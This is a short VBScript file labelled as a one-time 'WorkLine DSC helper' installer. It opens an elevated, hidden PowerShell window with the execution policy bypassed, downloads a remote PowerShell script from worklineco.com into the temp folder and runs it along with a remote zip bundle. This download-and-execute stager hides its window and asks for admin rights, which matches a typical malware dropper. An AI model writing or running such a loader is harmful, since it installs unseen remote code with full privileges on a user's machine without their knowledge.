Option Explicit
' One-time WorkLine DSC helper installer. Opens elevated hidden PowerShell.
Const SITE_ORIGIN = "https://worklineco.com"

Dim shell
Set shell = CreateObject("Shell.Application")

Dim psArgs
psArgs = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
  "& {$ErrorActionPreference='Stop'; $ProgressPreference='SilentlyContinue'; " & _
  "$installer = Join-Path $env:TEMP 'workline-dsc-install.ps1'; " & _
  "Invoke-WebRequest -Uri '" & SITE_ORIGIN & "/install-workline-dsc-helper.ps1' -OutFile $installer; " & _
  "& powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File $installer -BundleUrl '" & SITE_ORIGIN & "/dsc-helper-bundle.zip'}"

shell.ShellExecute "powershell.exe", psArgs, "", "runas", 0
